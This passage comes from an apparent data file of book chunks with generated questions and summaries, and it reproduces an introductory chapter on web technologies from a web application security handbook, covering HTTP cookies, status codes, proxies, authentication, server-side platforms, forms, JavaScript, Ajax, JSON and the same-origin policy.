authentication that the server supports.\nn X-Frame-Options indicates whether and how the current response may\nbe loaded within a browser frame (see Chapter 13).\ncc0033..iinndddd 4466 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 47\nChapter 3 n Web Application Technologies 47\nCookies\nCookies are a key part of the HTTP protocol that most web applications rely\non. Frequently they can be used as a vehicle for exploiting vulnerabilities. The\ncookie mechanism enables the server to send items of data to the client, which\nthe client stores and resubmits to the server. Unlike the other types of request\nparameters (those within the URL query string or the message body), cookies\ncontinue to be resubmitted in each subsequent request without any particular\naction required by the application or the user.\nA server issues a cookie using the Set-Cookie response header, as you\nhave seen:\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nThe user’s browser then automatically adds the following header to subsequent\nrequests back to the same server:\nCookie: tracking=tI8rk7joMx44S2Uu85nSWc\nCookies normally consist of a name/value pair, as shown, but they may consist\nof any string that does not contain a space. Multiple cookies can be issued by\nusing multiple Set-Cookie headers in the server’s response. These are submit-\nted back to the server in the same Cookie header, with a semicolon separating\ndifferent individual cookies.\nIn addition to the cookie’s actual value, the Set-Cookie header can include\nany of the following optional attributes, which can be used to control how the\nbrowser handles the cookie:\nn expires sets a date until which the cookie is valid. This causes the browser\nto save the cookie to persistent storage, and it is reused in subsequent\nbrowser sessions until the expiration date is reached. If this attribute is\nnot set, the cookie is used only in the current browser session.\nn domain specifi es the domain for which the cookie is valid. This must be\nthe same or a parent of the domain from which the cookie is received.\nn path specifi es the URL path for which the cookie is valid.\nn secure — If this attribute is set, the cookie will be submitted only in HTTPS\nrequests.\nn HttpOnly — If this attribute is set, the cookie cannot be directly accessed\nvia client-side JavaScript.\nEach of these cookie attributes can impact the application’s security. The\nprimary impact is on the attacker’s ability to directly target other users of the\napplication. See Chapters 12 and 13 for more details.\ncc0033..iinndddd 4477 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 48\n48 Chapter 3 n Web Application Technologies\nStatus Codes\nEach HTTP response message must contain a status code in its fi rst line, indi-\ncating the result of the request. The status codes fall into fi ve groups, according\nto the code’s fi rst digit:\nn 1xx — Informational.\nn 2xx — The request was successful.\nn 3xx — The client is redirected to a different resource.\nn 4xx — The request contains an error of some kind.\nn 5xx — The server encountered an error fulfi lling the request.\nThere are numerous specifi c status codes, many of which are used only in\nspecialized circumstances. Here are the status codes you are most likely to\nencounter when attacking a web application, along with the usual reason phrase\nassociated with them:\nn 100 Continue is sent in some circumstances when a client submits a\nrequest containing a body. The response indicates that the request headers\nwere received and that the client should continue sending the body. The\nserver returns a second response when the request has been completed.\nn 200 OK indicates that the request was successful and that the response\nbody contains the result of the request.\nn 201 Created is returned in response to a PUT request to indicate that the\nrequest was successful.\nn 301 Moved Permanently redirects the browser permanently to a different\nURL, which is specifi ed in the Location header. The client should use the\nnew URL in the future rather than the original.\nn 302 Found redirects the browser temporarily to a different URL, which is\nspecifi ed in the Location header. The client should revert to the original\nURL in subsequent requests.\nn 304 Not Modified instructs the browser to use its cached copy of the\nrequested resource. The server uses the If-Modified-Since and If-None-\nMatch request headers to determine whether the client has the latest version\nof the resource.\nn 400 Bad Request indicates that the client submitted an invalid HTTP request.\nYou will probably encounter this when you have modifi ed a request in\ncertain invalid ways, such as by placing a space character into the URL.\nn 401 Unauthorized indicates that the server requires HTTP authentication\nbefore the request will be granted. The WWW-Authenticate header contains\ndetails on the type(s) of authentication supported.\ncc0033..iinndddd 4488 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 49\nChapter 3 n Web Application Technologies 49\nn 403 Forbidden indicates that no one is allowed to access the requested\nresource, regardless of authentication.\nn 404 Not Found indicates that the requested resource does not exist.\nn 405 Method Not Allowed indicates that the method used in the request is\nnot supported for the specifi ed URL. For example, you may receive this\nstatus code if you attempt to use the PUT method where it is not supported.\nn 413 Request Entity Too Large — If you are probing for buffer overfl ow\nvulnerabilities in native code, and therefore are submitting long strings\nof data, this indicates that the body of your request is too large for the\nserver to handle.\nn 414 Request URI Too Long is similar to the 413 response. It indicates that\nthe URL used in the request is too large for the server to handle.\nn 500 Internal Server Error indicates that the server encountered an\nerror fulfi lling the request. This normally occurs when you have submit-\nted unexpected input that caused an unhandled error somewhere within\nthe application’s processing. You should closely review the full contents\nof the server’s response for any details indicating the nature of the error.\nn 503 Service Unavailable normally indicates that, although the web\nserver itself is functioning and can respond to requests, the application\naccessed via the server is not responding. You should verify whether this\nis the result of any action you have performed.",
    "question": "What are the key technologies and concepts related to HTTP protocol and web application attacks that are discussed in this chapter?",
    "summary": "This chapter introduces key web application technologies, including HTTP, its request and response formats, common methods like GET and POST, and headers used in both requests and responses. It also explains how cookies function and the significance of HTTP status codes in web application security. The text emphasizes understanding these technologies to effectively attack web applications and highlights the importance of using appropriate methods and headers for secure interactions."
  },
  {
    "start": 50,
    "end": 66,
    "text": "HTTPS\nThe HTTP protocol uses plain TCP as its transport mechanism, which is unen-\ncrypted and therefore can be intercepted by an attacker who is suitably posi-\ntioned on the network. HTTPS is essentially the same application-layer protocol\nas HTTP but is tunneled over the secure transport mechanism, Secure Sockets\nLayer (SSL). This protects the privacy and integrity of data passing over the\nnetwork, reducing the possibilities for noninvasive interception attacks. HTTP\nrequests and responses function in exactly the same way regardless of whether\nSSL is used for transport.\nNOTE SSL has strictly been superseded by transport layer security (TLS), but\nthe latter usually still is referred to using the older name.\nHTTP Proxies\nAn HTTP proxy is a server that mediates access between the client browser and\nthe destination web server. When a browser has been confi gured to use a proxy\ncc0033..iinndddd 4499 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 50\n50 Chapter 3 n Web Application Technologies\nserver, it makes all its requests to that server. The proxy relays the requests to\nthe relevant web servers and forwards their responses back to the browser.\nMost proxies also provide additional services, including caching, authentica-\ntion, and access control.\nYou should be aware of two differences in how HTTP works when a proxy\nserver is being used:\nn When a browser issues an unencrypted HTTP request to a proxy server, it\nplaces the full URL into the request, including the protocol prefi x http://,\nthe server’s hostname, and the port number if this is nonstandard. The\nproxy server extracts the hostname and port and uses these to direct the\nrequest to the correct destination web server.\nn When HTTPS is being used, the browser cannot perform the SSL hand-\nshake with the proxy server, because this would break the secure tunnel\nand leave the communications vulnerable to interception attacks. Hence,\nthe browser must use the proxy as a pure TCP-level relay, which passes\nall network data in both directions between the browser and the destina-\ntion web server, with which the browser performs an SSL handshake as\nnormal. To establish this relay, the browser makes an HTTP request to the\nproxy server using the CONNECT method and specifying the destination\nhostname and port number as the URL. If the proxy allows the request,\nit returns an HTTP response with a 200 status, keeps the TCP connection\nopen, and from that point onward acts as a pure TCP-level relay to the\ndestination web server.\nBy some measure, the most useful item in your toolkit when attacking web\napplications is a specialized kind of proxy server that sits between your browser\nand the target website and allows you to intercept and modify all requests and\nresponses, even those using HTTPS. We will begin examining how you can use\nthis kind of tool in the next chapter.\nHTTP Authentication\nThe HTTP protocol includes its own mechanisms for authenticating users using\nvarious authentication schemes, including the following:\nn Basic is a simple authentication mechanism that sends user credentials as\na Base64-encoded string in a request header with each message.\nn NTLM is a challenge-response mechanism and uses a version of the\nWindows NTLM protocol.\nn Digest is a challenge-response mechanism and uses MD5 checksums of\na nonce with the user’s credentials.\ncc0033..iinndddd 5500 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 51\nChapter 3 n Web Application Technologies 51\nIt is relatively rare to encounter these authentication protocols being used\nby web applications deployed on the Internet. They are more commonly used\nwithin organizations to access intranet-based services.\n\nCOMMON MYTH\n“Basic authentication is insecure.”\nBecause basic authentication places credentials in unencrypted form within\nthe HTTP request, it is frequently stated that the protocol is insecure and\nshould not be used. But forms-based authentication, as used by numerous\nbanks, also places credentials in unencrypted form within the HTTP request.\nAny HTTP message can be protected from eavesdropping attacks by using HTTPS\nas a transport mechanism, which should be done by every security-conscious\napplication. In relation to eavesdropping, at least, basic authentication in itself\nis no worse than the methods used by the majority of today’s web applications.\nWeb Functionality\nIn addition to the core communications protocol used to send messages between\nclient and server, web applications employ numerous technologies to deliver\ntheir functionality. Any reasonably functional application may employ dozens\nof distinct technologies within its server and client components. Before you can\nmount a serious attack against a web application, you need a basic understand-\ning of how its functionality is implemented, how the technologies used are\ndesigned to behave, and where their weak points are likely to lie.\nServer-Side Functionality\nThe early World Wide Web contained entirely static content. Websites con-\nsisted of various resources such as HTML pages and images, which were\nsimply loaded onto a web server and delivered to any user who requested\nthem. Each time a particular resource was requested, the server responded\nwith the same content.\nToday’s web applications still typically employ a fair number of static resources.\nHowever, a large amount of the content that they present to users is generated\ndynamically. When a user requests a dynamic resource, the server’s response\nis created on the fl y, and each user may receive content that is uniquely custom-\nized for him or her.\nDynamic content is generated by scripts or other code executing on the server.\nThese scripts are akin to computer programs in their own right. They have vari-\nous inputs, perform processing on these, and return their outputs to the user.\ncc0033..iinndddd 5511 88//1199//22001111 1122::0033::4444 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 52\n52 Chapter 3 n Web Application Technologies\nWhen a user’s browser requests a dynamic resource, normally it does not\nsimply ask for a copy of that resource. In general, it also submits various\nparameters along with its request. It is these parameters that enable the server-\nside application to generate content that is tailored to the individual user.\nHTTP requests can be used to send parameters to the application in three\nmain ways:\nn In the URL query string\nn In the fi le path of REST-style URLs\nn In HTTP cookies\nn In the body of requests using the POST method\nIn addition to these primary sources of input, the server-side application may\nin principle use any part of the HTTP request as an input to its processing. For\nexample, an application may process the User-Agent header to generate content\nthat is optimized for the type of browser being used.\nLike computer software in general, web applications employ a wide range of\ntechnologies on the server side to deliver their functionality:\nn Scripting languages such as PHP, VBScript, and Perl\nn Web application platforms such as ASP.NET and Java\nn Web servers such as Apache, IIS, and Netscape Enterprise\nn Databases such as MS-SQL, Oracle, and MySQL\nn Other back-end components such as fi lesystems, SOAP-based web services,\nand directory services\nAll these technologies and the types of vulnerabilities that can arise in rela-\ntion to them are examined in detail throughout this book. Some of the most\ncommon web application platforms and technologies you are likely to encounter\nare described in the following sections.\n\nCOMMON MYTH\n“Our applications need only cursory security review, because they employ a\nwell-used framework.”\nUse of a well-used framework is often a cause for complacency in web\napplication development, on the assumption that common vulnerabilities\nsuch as SQL injection are automatically avoided. This assumption is mistaken\nfor two reasons.\nFirst, a large number of web application vulnerabilities arise in an applica-\ntion’s design, not its implementation, and are independent of the development\nframework or language chosen.\ncc0033..iinndddd 5522 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 53\nChapter 3 n Web Application Technologies 53\nSecond, because a framework typically employs plug-ins and packages\nfrom the cutting edge of the latest repositories, it is likely that these packages\nhave not undergone security review. Interestingly, if a vulnerability is later\nfound in the application, the same proponents of the myth will readily swap\nsides and blame their framework or third-party package!\nThe Java Platform\nFor many years, the Java Platform, Enterprise Edition (formerly known as J2EE)\nwas a de facto standard for large-scale enterprise applications. Originally devel-\noped by Sun Microsystems and now owned by Oracle, it lends itself to multitiered\nand load-balanced architectures and is well suited to modular development and\ncode reuse. Because of its long history and widespread adoption, many high-\nquality development tools, application servers, and frameworks are available to\nassist developers. The Java Platform can be run on several underlying operating\nsystems, including Windows, Linux, and Solaris.\nDescriptions of Java-based web applications often employ a number of poten-\ntially confusing terms that you may need to be aware of:\nn AnEnterprise Java Bean (EJB) is a relatively heavyweight software com-\nponent that encapsulates the logic of a specifi c business function within the\napplication. EJBs are intended to take care of various technical challenges\nthat application developers must address, such as transactional integrity.\nn A Plain Old Java Object (POJO) is an ordinary Java object, as distinct\nfrom a special object such as an EJB. A POJO normally is used to denote\nobjects that are user-defi ned and are much simpler and more lightweight\nthan EJBs and those used in other frameworks.\nn AJava Servlet is an object that resides on an application server and receives\nHTTP requests from clients and returns HTTP responses. Servlet imple-\nmentations can use numerous interfaces to facilitate the development of\nuseful applications.\nn A Java web container is a platform or engine that provides a runtime\nenvironment for Java-based web applications. Examples of Java web con-\ntainers are Apache Tomcat, BEA WebLogic, and JBoss.\nMany Java web applications employ third-party and open source components\nalongside custom-built code. This is an attractive option because it reduces\ndevelopment effort, and Java is well suited to this modular approach. Here are\nsome examples of components commonly used for key application functions:\nn Authentication — JAAS, ACEGI\nn Presentation layer — SiteMesh, Tapestry\ncc0033..iinndddd 5533 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 54\n54 Chapter 3 n Web Application Technologies\nn Database object relational mapping — Hibernate\nn Logging — Log4J\nIf you can determine which open source packages are used in the application\nyou are attacking, you can download these and perform a code review or install\nthem to experiment on. A vulnerability in any of these may be exploitable to\ncompromise the wider application.\n\nASP.NET\nASP.NET is Microsoft’s web application framework and is a direct competitor\nto the Java Platform. ASP.NET is several years younger than its counterpart but\nhas made signifi cant inroads into Java’s territory.\nASP.NET uses Microsoft’s .NET Framework, which provides a virtual machine\n(the Common Language Runtime) and a set of powerful APIs. Hence, ASP.NET\napplications can be written in any .NET language, such as C# or VB.NET.\nASP.NET lends itself to the event-driven programming paradigm that is\nnormally used in conventional desktop software, rather than the script-based\napproach used in most earlier web application frameworks. This, together with\nthe powerful development tools provided with Visual Studio, makes devel-\noping a functional web application extremely easy for anyone with minimal\nprogramming skills.\nThe ASP.NET framework helps protect against some common web application\nvulnerabilities such as cross-site scripting, without requiring any effort from\nthe developer. However, one practical downside of its apparent simplicity is that\nmany small-scale ASP.NET applications are actually created by beginners who\nlack any awareness of the core security problems faced by web applications.\nPHP\nThe PHP language emerged from a hobby project (the acronym originally stood\nfor “personal home page”). It has since evolved almost unrecognizably into\na highly powerful and rich framework for developing web applications. It is\noften used in conjunction with other free technologies in what is known as the\nLAMP stack (composed of Linux as the operating system, Apache as the web\nserver, MySQL as the database server, and PHP as the programming language\nfor the web application).\nNumerous open source applications and components have been developed\nusing PHP. Many of these provide off-the-shelf solutions for common application\nfunctions, which are often incorporated into wider custom-built applications:\nn Bulletin boards — PHPBB, PHP-Nuke\nn Administrative front ends — PHPMyAdmin\ncc0033..iinndddd 5544 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 55\nChapter 3 n Web Application Technologies 55\nn Web mail — SquirrelMail, IlohaMail\nn Photo galleries — Gallery\nn Shopping carts — osCommerce, ECW-Shop\nn Wikis — MediaWiki, WakkaWikki\nBecause PHP is free and easy to use, it has often been the language of choice\nfor many beginners writing web applications. Furthermore, the design and\ndefault confi guration of the PHP framework has historically made it easy for\nprogrammers to unwittingly introduce security bugs into their code. These\nfactors have meant that applications written in PHP have suffered from a dis-\nproportionate number of security vulnerabilities. In addition, several defects\nhave existed within the PHP platform itself that often could be exploited via\napplications running on it. See Chapter 19 for details on common defects aris-\ning in PHP applications.\nRuby on Rails\nRails 1.0 was released in 2005, with strong emphasis on Model-View-Controller\narchitecture. A key strength of Rails is the breakneck speed with which\nfully fl edged data-driven applications can be created. If a developer follows the\nRails coding style and naming conventions, Rails can autogenerate a model\nfor database content, controller actions for modifying it, and default views for\nthe application user. As with any highly functional new technology, several\nvulnerabilities have been found in Ruby on Rails, including the ability to bypass\na “safe mode,” analogous to that found in PHP.\nMore details on recent vulnerabilities can be found here:\nwww.ruby-lang.org/en/security/\nSQL\nStructured Query Language (SQL) is used to access data in relational databases,\nsuch as Oracle, MS-SQL server and MySQL. The vast majority of today’s web\napplications employ SQL-based databases as their back-end data store, and nearly\nall application functions involve interaction with these data stores in some way.\nRelational databases store data in tables, each of which contains a number\nof rows and columns. Each column represents a data fi eld, such as “name” or\n“e-mail address,” and each row represents an item with values assigned to some\nor all of these fi elds.\nSQL uses queries to perform common tasks such as reading, adding, updat-\ning, and deleting data. For example, to retrieve a user’s e-mail address with a\nspecifi ed name, an application might perform the following query:\nselect email from users where name = ‘daf’\ncc0033..iinndddd 5555 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 56\n56 Chapter 3 n Web Application Technologies\nTo implement the functionality they need, web applications may incorporate\nuser-supplied input into SQL queries that are executed by the back-end data-\nbase. If this process is not carried out safely, attackers may be able to submit\nmalicious input to interfere with the database and potentially read and write\nsensitive data. These attacks are described in Chapter 9, along with detailed\nexplanations of the SQL language and how it can be used.\nXML\nExtensible Markup Language (XML) is a specifi cation for encoding data in a\nmachine-readable form. Like any markup language, the XML format sepa-\nrates a document into content (which is data) and markup (which annotates\nthe data).\nMarkup is primarily represented using tags, which may be start tags, end\ntags, or empty-element tags:\n<tagname>\n</tagname>\n<tagname />\nStart and end tags are paired into elements and may encapsulate document\ncontent or child elements:\n<pet>ginger</pet>\n<pets><dog>spot</dog><cat>paws</cat></pets>\nTags may include attributes, which are name/value pairs:\n<data version=”2.1”><pets>...</pets></data>\nXML is extensible in that it allows arbitrary tag and attribute names. XML\ndocuments often include a Document Type Defi nition (DTD), which defi nes\nthe tags and attributes used in the documents and the ways in which they can\nbe combined.\nXML and technologies derived from it are used extensively in web applica-\ntions, on both the server and client side, as described in later sections of this\nchapter.\nWeb Services\nAlthough this book covers web application hacking, many of the vulnerabilities\ndescribed are equally applicable to web services. In fact, many applications are\nessentially a GUI front-end to a set of back-end web services.\ncc0033..iinndddd 5566 88//1199//22001111 1122::0033::4455 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 57\nChapter 3 n Web Application Technologies 57\nWeb services use Simple Object Access Protocol (SOAP) to exchange data.\nSOAP typically uses the HTTP protocol to transmit messages and represents\ndata using the XML format.\nA typical SOAP request is as follows:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Type: application/soap+xml; charset=utf-8\nContent-Length: 891\n<?xml version=”1.0”?>\n<soap:Envelope xmlns:soap=”http://www.w3.org/2001/12/soap-envelope”>\n<soap:Body>\n<pre:Add xmlns:pre=http://target/lists soap:encodingStyle=\n“http://www.w3.org/2001/12/soap-encoding”>\n<Account>\n<FromAccount>18281008</FromAccount>\n<Amount>1430</Amount>\n<ClearedFunds>False</ClearedFunds>\n<ToAccount>08447656</ToAccount>\n</Account>\n</pre:Add>\n</soap:Body>\n</soap:Envelope>\nIn the context of web applications accessed using a browser, you are most\nlikely to encounter SOAP being used by the server-side application to com-\nmunicate with various back-end systems. If user-supplied data is incorporated\ndirectly into back-end SOAP messages, similar vulnerabilities can arise as for\nSQL. These issues are described in detail in Chapter 10.\nIf a web application also exposes web services directly, these are also worthy\nof examination. Even if the front-end application is simply written on top of the\nweb service, differences may exist in input handling and in the functionality\nexposed by the services themselves. The server normally publishes the available\nservices and parameters using the Web Services Description Language (WSDL)\nformat. Tools such as soapUI can be used to create sample requests based on a\npublished WSDL fi le to call the authentication web service, gain an authentica-\ntion token, and make any subsequent web service requests.\nClient-Side Functionality\nFor the server-side application to receive user input and actions and present\nthe results to the user, it needs to provide a client-side user interface. Because\nall web applications are accessed via a web browser, these interfaces all share a\ncc0033..iinndddd 5577 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 58\n58 Chapter 3 n Web Application Technologies\ncommon core of technologies. However, these have been built upon in various,\ndiverse ways, and the ways in which applications leverage client-side technol-\nogy has continued to evolve rapidly in recent years.\n\nHTML\nThe core technology used to build web interfaces is hypertext markup language\n(HTML). Like XML, HTML is a tag-based language that is used to describe the\nstructure of documents that are rendered within the browser. From its simple\nbeginnings as a means of providing basic formatting for text documents, HTML\nhas developed into a rich and powerful language that can be used to create\nhighly complex and functional user interfaces. XHTML is a development of HTML that is based on XML and that has a stricter\nspecifi cation than older versions of HTML. Part of the motivation for XHTML\nwas the need to move toward a more rigid standard for HTML markup to avoid\nthe various compromises and security issues that can arise when browsers are\nobligated to tolerate less-strict forms of HTML. More details about HTML and related technologies appear in the following\nsections. Hyperlinks\nA large amount of communication from client to server is driven by the user’s\nclicking on hyperlinks. In web applications, hyperlinks frequently contain preset\nrequest parameters. These are items of data that the user never enters; they are\nsubmitted because the server places them into the target URL of the hyperlink\nthat the user clicks. For example, a web application might present a series of\nlinks to news stories, each having the following form:\n<a href=”?redir=/updates/update29.html”>What’s happening?</a>\nWhen a user clicks this link, the browser makes the following request:\nGET /news/8/?redir=/updates/update29.html HTTP/1.1\nHost: mdsec.net\n... The server receives the redir parameter in the query string and uses its value\nto determine what content should be presented to the user. Forms\nAlthough hyperlink-based navigation is responsible for a large amount of client-\nto-server communications, most web applications need more fl exible ways\nto gather input and receive actions from users. HTML forms are the usual\ncc0033..iinndddd 5588 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 59\nChapter 3 n Web Application Technologies 59\nmechanism for allowing users to enter arbitrary input via their browser. A\ntypical form is as follows:\n<form action=”/secure/login.php?app=quotations” method=”post”>\nusername: <input type=”text” name=”username”><br>\npassword: <input type=”password” name=”password”>\n<input type=”hidden” name=”redir” value=”/secure/home.php”>\n<input type=”submit” name=”submit” value=”log in”>\n</form>\nWhen the user enters values into the form and clicks the Submit button, the\nbrowser makes a request like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 39\nCookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\nusername=daf&password=foo&redir=/secure/home.php&submit=log+in\nIn this request, several points of interest refl ect how different aspects of the\nrequest are used to control server-side processing:\nn Because the HTML form tag contains an attribute specifying the POST\nmethod, the browser uses this method to submit the form and places the\ndata from the form into the body of the request message. n In addition to the two items of data that the user enters, the form contains\na hidden parameter (redir) and a submit parameter (submit). Both of\nthese are submitted in the request and may be used by the server-side\napplication to control its logic. n The target URL for the form submission contains a preset parameter (app),\nas in the hyperlink example shown previously. This parameter may be\nused to control the server-side processing. n The request contains a cookie parameter (SESS), which was issued to the\nbrowser in an earlier response from the server. This parameter may be\nused to control the server-side processing. The preceding request contains a header specifying that the type of content in\nthe message body is x-www-form-urlencoded. This means that parameters are\nrepresented in the message body as name/value pairs in the same way as they\nare in the URL query string. The other content type you are likely to encoun-\nter when form data is submitted is multipart/form-data. An application can\nrequest that browsers use multipart encoding by specifying this in an enctype\nattribute in the form tag. With this form of encoding, the Content-Type header\nin the request also specifi es a random string that is used as a separator for the\ncc0033..iinndddd 5599 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 60\n60 Chapter 3 n Web Application Technologies\nparameters contained in the request body. For example, if the form specifi ed\nmultipart encoding, the resulting request would look like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: multipart/form-data; boundary=------------7d71385d0a1a\nContent-Length: 369\nCookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”username”\ndaf\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”password”\nfoo\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”redir”\n/secure/home.php\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”submit”\nlog in\n------------7d71385d0a1a--\nCSS\nCascading Style Sheets (CSS) is a language used to describe the presentation of a\ndocument written in a markup language. Within web applications, it is used to\nspecify how HTML content should be rendered on-screen (and in other media,\nsuch as the printed page). Modern web standards aim to separate as much as possible the content of a\ndocument from its presentation. This separation has numerous benefi ts, includ-\ning simpler and smaller HTML pages, easier updating of formatting across a\nwebsite, and improved accessibility. CSS is based on formatting rules that can be defi ned with different levels\nof specifi city. Where multiple rules match an individual document element,\ndifferent attributes defi ned in those rules can “cascade” through these rules so\nthat the appropriate combination of style attributes is applied to the element. CSS syntax uses selectors to defi ne a class of markup elements to which\na given set of attributes should be applied. For example, the following\nCSS rule defi nes the foreground color for headings that are marked up using\n<h2> tags:\nh2 { color: red; }\ncc0033..iinndddd 6600 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 61\nChapter 3 n Web Application Technologies 61\nIn the earliest days of web application security, CSS was largely overlooked\nand was considered to have no security implications. Today, CSS is increasingly\nrelevant both as a source of security vulnerabilities in its own right and as a\nmeans of delivering effective exploits for other categories of vulnerabilities (see\nChapters 12 and 13 for more information). JavaScript\nHyperlinks and forms can be used to create a rich user interface that can easily\ngather most kinds of input that web applications require. However, most appli-\ncations employ a more distributed model, in which the client side is used not\nsimply to submit user data and actions but also to perform actual processing\nof data. This is done for two primary reasons:\nn It can improve the application’s performance, because certain tasks can\nbe carried out entirely on the client component, without needing to make\na round trip of request and response to the server. n It can enhance usability, because parts of the user interface can be dynami-\ncally updated in response to user actions, without needing to load an\nentirely new HTML page delivered by the server. JavaScript is a relatively simple but powerful programming language that\ncan be easily used to extend web interfaces in ways that are not possible using\nHTML alone. It is commonly used to perform the following tasks:\nn Validating user-entered data before it is submitted to the server to avoid\nunnecessary requests if the data contains errors\nn Dynamically modifying the user interface in response to user actions — for\nexample, to implement drop-down menus and other controls familiar\nfrom non-web interfaces\nn Querying and updating the document object model (DOM) within the\nbrowser to control the browser’s behavior (the browser DOM is described\nin a moment)\nVBScript\nVBScript is an alternative to JavaScript that is supported only in the Internet\nExplorer browser. It is modeled on Visual Basic and allows interaction with\nthe browser DOM. But in general it is somewhat less powerful and developed\nthan JavaScript. Due to its browser-specifi c nature, VBScript is scarcely used in today’s web\napplications. Its main interest from a security perspective is as a means of\ndelivering exploits for vulnerabilities such as cross-site scripting in occasional\nsituations where an exploit using JavaScript is not feasible (see Chapter 12). cc0033..iinndddd 6611 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 62\n62 Chapter 3 n Web Application Technologies\nDocument Object Model\nThe Document Object Model (DOM) is an abstract representation of an HTML\ndocument that can be queried and manipulated through its API. The DOM allows client-side scripts to access individual HTML elements by\ntheir id and to traverse the structure of elements programmatically. Data such\nas the current URL and cookies can also be read and updated. The DOM also\nincludes an event model, allowing code to hook events such as form submission,\nnavigation via links, and keystrokes. Manipulation of the browser DOM is a key technique used in Ajax-based\napplications, as described in the following section. Ajax\nAjax is a collection of programming techniques used on the client side to create\nuser interfaces that aim to mimic the smooth interaction and dynamic behavior\nof traditional desktop applications. The name originally was an acronym for “Asynchronous JavaScript and\nXML,” although in today’s web Ajax requests need not be asynchronous and\nneed not employ XML. The earliest web applications were based on complete pages. Each user action,\nsuch as clicking a link or submitting a form, initiated a window-level navigation\nevent, causing a new page to be loaded from the server. This approach resulted\nin a disjointed user experience, with noticeable delays while large responses\nwere received from the server and the whole page was rerendered. With Ajax, some user actions are handled within client-side script code and\ndo not cause a full reload of the page. Instead, the script performs a request “in\nthe background” and typically receives a much smaller response that is used to\ndynamically update only part of the user interface. For example, in an Ajax-based\nshopping application, clicking an Add to Cart button may cause a background\nrequest that updates the server-side record of the user’s shopping cart and a\nlightweight response that updates the number of cart items showing on the\nuser’s screen. Virtually the entire existing page remains unmodifi ed within the\nbrowser, providing a much faster and more satisfying experience for the user. The core technology used in Ajax is XMLHttpRequest. After a certain consolida-\ntion of standards, this is now a native JavaScript object that client-side scripts can\nuse to make “background” requests without requiring a window-level naviga-\ntion event. Despite its name, XMLHttpRequest allows arbitrary content to be sent\nin requests and received in responses. Although many Ajax applications do use\nXML to format message data, an increasing number have opted to exchange data\nusing other methods of representation. (See the next section for one example.)\nNote that although most Ajax applications do use asynchronous communica-\ntions with the server, this is not essential. In some situations, it may actually make\ncc0033..iinndddd 6622 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 63\nChapter 3 n Web Application Technologies 63\nmore sense to prevent user interaction with the application while a particular\naction is carried out. In these situations, Ajax is still benefi cial in providing a\nmore seamless experience by avoiding the need to reload an entire page. Historically, the use of Ajax has introduced some new types of vulnerabili-\nties into web applications. More broadly, it also increases the attack surface of\na typical application by introducing more potential targets for attack on both\nthe server and client side.\n\nAjax techniques are also available for use by attack-\ners when they are devising more effective exploits for other vulnerabilities. See\nChapters 12 and 13 for more details.\n\nJSON\nJavaScript Object Notation (JSON) is a simple data transfer format that can\nbe used to serialize arbitrary data. It can be processed directly by JavaScript\ninterpreters. It is commonly employed in Ajax applications as an alternative to\nthe XML format originally used for data transmission. In a typical situation,\nwhen a user performs an action, client-side JavaScript uses XMLHttpRequest to\ncommunicate the action to the server. The server returns a lightweight response\ncontaining data in JSON format. The client-side script then processes this data\nand updates the user interface accordingly.\nFor example, an Ajax-based web mail application may contain a feature to\nshow the details of a selected contact. When a user clicks a contact, the browser\nuses XMLHttpRequest to retrieve the details of the selected contact, which are\nreturned using JSON:\n{\n“name”: “Mike Kemp”,\n“id”: “8041148671”,\n“email”: “fkwitt@layerone.com”\n}\nThe client-side script uses the JavaScript interpreter to consume the JSON\nresponse and updates the relevant part of the user interface based on its contents.\nA further location where you may encounter JSON data in today’s applications\nis as a means of encapsulating data within conventional request parameters. For\nexample, when the user updates the details of a contact, the new information\nmight be communicated to the server using the following request:\nPOST /contacts HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 89\nContact={“name”:”Mike Kemp”,”id”:”8041148671”,”email”:”pikey@\nclappymonkey.com”}\n&submit=update\ncc0033..iinndddd 6633 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 64\n64 Chapter 3 n Web Application Technologies\nSame-Origin Policy\nThe same-origin policy is a key mechanism implemented within browsers that\nis designed to keep content that came from different origins from interfering\nwith each other. Basically, content received from one website is allowed to read\nand modify other content received from the same site but is not allowed to\naccess content received from other sites.\nIf the same-origin policy did not exist, and an unwitting user browsed to a\nmalicious website, script code running on that site could access the data and\nfunctionality of any other website also visited by the user. This may enable the\nmalicious site to perform funds transfers from the user’s online bank, read his\nor her web mail, 